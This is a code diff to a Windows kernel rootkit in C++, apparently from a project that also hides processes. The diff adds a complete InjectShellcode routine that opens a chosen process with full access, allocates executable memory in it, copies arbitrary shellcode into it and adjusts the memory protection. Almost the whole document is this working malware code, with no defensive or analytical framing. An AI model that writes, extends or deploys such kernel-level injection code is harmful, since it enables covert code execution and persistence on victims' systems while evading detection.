@@ -1,4 +1,4 @@
-#include  "stdlib.h"
+#include "stdlib.h"
 #include "hijack.hpp"
 #include "rootkit.hpp"
 
@@ -180,4 +180,75 @@ PCHAR Rootkit::HideProc(UINT32 PID)
 	}
 
 	return (PCHAR)result;
+}
+
+PVOID Rootkit::InjectShellcode(Shell* shell)
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	HANDLE handle;
+	PEPROCESS process, cProcess;
+	PVOID buffer = { 0 };
+	CLIENT_ID clientId = { 0 };
+	OBJECT_ATTRIBUTES objAttr = { 0 };
+	SIZE_T shellSize = shell->size;
+	PVOID shellBuf = reinterpret_cast<PVOID>(shell->shellcode);
+
+	cProcess = PsGetCurrentProcess();
+
+	clientId.UniqueThread = NULL;
+	clientId.UniqueProcess = ULongToHandle(shell->pid);
+	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+	status = ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
+	if (!NT_SUCCESS(status))
+	{
+#if DEBUG
+		DbgPrint("[-] Could not open process\n");
+#endif
+		return NULL;
+	}
+
+	status = PsLookupProcessByProcessId((HANDLE)shell->pid, &process);
+	if (!NT_SUCCESS(status))
+	{
+#if DEBUG
+		DbgPrint("[-] Could not find process\n");
+#endif
+		ZwClose(handle);
+		return NULL;
+	}
+
+	status = ZwAllocateVirtualMemory(handle, &buffer, NULL, &shellSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	if (!NT_SUCCESS(status))
+	{
+#if DEBUG
+		DbgPrint("[-] Could not allocate memory\n");
+#endif
+		ZwClose(handle);
+		return NULL;
+	}
+
+	SIZE_T rSize;
+	status = MmCopyVirtualMemory(cProcess, shellBuf, process, buffer, shellSize, KernelMode, &rSize);
+	if (!NT_SUCCESS(status))
+	{
+#if DEBUG
+		DbgPrint("[-] Could not copy memory\n");
+#endif
+		ZwClose(handle);
+		return NULL;
+	}
+
+	status = ZwProtectVirtualMemory(handle, &buffer, &shellSize, PAGE_EXECUTE_READ, (PULONG)PAGE_EXECUTE_READWRITE);
+	if (!NT_SUCCESS(status))
+	{
+#if DEBUG
+		KdPrint(("[-] Could not change memory protection"));
+#endif
+		ZwClose(handle);
+	}
+
+	ZwClose(handle);
+
+	return buffer;
 }
